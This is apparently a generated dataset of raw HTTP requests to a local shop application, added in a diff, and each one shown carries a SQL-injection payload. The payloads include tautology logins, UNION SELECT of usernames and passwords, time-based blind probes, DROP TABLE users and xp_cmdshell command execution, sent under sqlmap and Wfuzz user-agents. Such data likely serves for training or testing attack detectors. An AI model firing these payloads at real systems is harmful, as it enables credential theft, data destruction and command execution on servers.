+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?name=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+
+q=%27+OR+%27%27%3D%27&usr_login=carol&usr_passwd=pass123
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: sqlmap/1.6.7#stable
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+
+file=1+AND+SLEEP%285%29+--
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 82
+
+usuario=1%3B+EXEC+xp_cmdshell%28%27dir%27%29+--&usr_login=henry&usr_passwd=pass123
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+
+search=1%3B+EXEC+xp_cmdshell%28%27dir%27%29+--&usr_login=eve&usr_passwd=hello2024
+
+GET /tienda1/anadir.jsp?page=%27%20OR%20%27%27%3D%27 HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+
+search=1%3B+DROP+TABLE+users+--
+
+GET /index.html?search=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?q=admin%27%20--&offset=3 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/caracteristicas.jsp?usuario=%27%20OR%20%27%27%3D%27&offset=3 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?texto=%27%20OR%20%271%27%3D%271&offset=6 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+
+page=admin%27+--&usr_login=frank&usr_passwd=dragon88
+
+GET /index.html?texto=1%20OR%201%3D1%20%23&offset=9 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+
+page=1%3B+DROP+TABLE+users+--&usr_login=eve&usr_passwd=qwerty
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+
+id=1+OR+1%3D1+%23&usr_login=frank&usr_passwd=letmein
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+
+name=%27+OR+%271%27%3D%271
+
+GET /tienda1/publico/caracteristicas.jsp?id=1%20AND%20SLEEP%285%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+
+categoria=1+OR+1%3D1+%23&usr_login=dave&usr_passwd=abc12345
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
+
+usuario=1+UNION+SELECT+username%2C+password+FROM+users+--&usr_login=bob&usr_passwd=qwerty
+
+GET /tienda1/publico/articulo.jsp?search=%27%20UNION%20ALL%20SELECT%20NULL%2C%20version%28%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: sqlmap/1.6.7#stable
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 86
+
+texto=%27+UNION+ALL+SELECT+NULL%2C+version%28%29+--&usr_login=frank&usr_passwd=pass123
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 86
+
+q=1+UNION+SELECT+username%2C+password+FROM+users+--&usr_login=dave&usr_passwd=abc12345
+
+GET /tienda1/publico/caracteristicas.jsp?id=%27%20UNION%20ALL%20SELECT%20NULL%2C%20version%28%29%20--&offset=2 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?q=1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29%20--&offset=9 HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/listado.jsp?name=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20--&offset=1 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+
+file=1+UNION+SELECT+username%2C+password+FROM+users+--
+
+GET /index.html?texto=%27%20OR%20%271%27%3D%271&offset=1 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/articulo.jsp?file=1%20OR%201%3D1%20%23&offset=6 HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /index.html?file=1%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--&offset=3 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /index.html?q=1%20OR%201%3D1%20%23&offset=2 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/caracteristicas.jsp?page=1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29%20--&offset=4 HTTP/1.1
+Host: localhost:8080
+User-Agent: sqlmap/1.6.7#stable
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/listado.jsp?page=1%3B%20DROP%20TABLE%20users%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/caracteristicas.jsp?name=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20--&offset=6 HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+
+file=1%3B+EXEC+xp_cmdshell%28%27dir%27%29+--
+
+GET /tienda1/publico/caracteristicas.jsp?file=admin%27%20--&offset=2 HTTP/1.1
+Host: localhost:8080
+User-Agent: sqlmap/1.6.7#stable
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: sqlmap/1.6.7#stable
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+
+usuario=1+AND+SLEEP%285%29+--&usr_login=bob&usr_passwd=hello2024
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+
+cmd=1+OR+1%3D1+%23&usr_login=dave&usr_passwd=pass123
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 82
+
+name=%27+UNION+ALL+SELECT+NULL%2C+version%28%29+--&usr_login=eve&usr_passwd=qwerty
+
+GET /tienda1/publico/articulo.jsp?search=%27%20OR%20%27%27%3D%27 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/buscar.jsp?texto=1%20OR%201%3D1%20%23 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/7.68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+
+id=1%3B+EXEC+xp_cmdshell%28%27dir%27%29+--&usr_login=henry&usr_passwd=qwerty
+
+GET /tienda1/publico/buscar.jsp?usuario=1%3B%20DROP%20TABLE%20users%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+
+page=admin%27+--&usr_login=eve&usr_passwd=hello2024
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 23
+
+cmd=%27+OR+%27%27%3D%27
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+
+usuario=%27+OR+%27%27%3D%27&usr_login=frank&usr_passwd=letmein
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+
+texto=1+OR+1%3D1+%23&usr_login=eve&usr_passwd=qwerty
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Wfuzz/2.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
+
+search=1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+users%29%3E0+--&usr_login=frank&usr_passwd=hello2024
+
+GET /tienda1/publico/buscar.jsp?name=admin%27%20--&offset=1 HTTP/1.1
+Host: localhost:8080
+User-Agent: python-requests/2.28.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/autenticar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
+
+cmd=1+UNION+SELECT+username%2C+password+FROM+users+--&usr_login=carol&usr_passwd=abc12345
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+
+id=1+WAITFOR+DELAY+%270%3A0%3A5%27+--
+
+GET /index.html?categoria=1%27%20OR%20%271%27%3D%271%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Wfuzz/2.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /index.html?texto=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/registro.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+
+cmd=1%3B+EXEC+xp_cmdshell%28%27dir%27%29+--&usr_login=dave&usr_passwd=letmein
+
+GET /index.html?name=%27%20OR%20%271%27%3D%271 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+
+id=admin%27+--
+
+GET /tienda1/publico/buscar.jsp?cmd=1%27%20OR%20%271%27%3D%271%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Wfuzz/2.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/articulo.jsp?usuario=1%20OR%201%3D1%20%23&offset=8 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?cmd=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0%20--&offset=3 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /index.html?name=1%27%20OR%20%271%27%3D%271%27%20--&offset=1 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /index.html?id=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20--&offset=4 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/buscar.jsp?name=%27%20OR%20%27%27%3D%27 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/caracteristicas.jsp?name=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /index.html?categoria=1%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--&offset=5 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?q=1%3B%20EXEC%20xp_cmdshell%28%27dir%27%29%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/listado.jsp?page=1%27%20OR%20%271%27%3D%271%27%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/anadir.jsp?id=1%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20-- HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+GET /tienda1/publico/articulo.jsp?file=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20--&offset=2 HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+
+POST /tienda1/publico/buscar.jsp HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+
+file=%27+OR+%27%27%3D%27
+
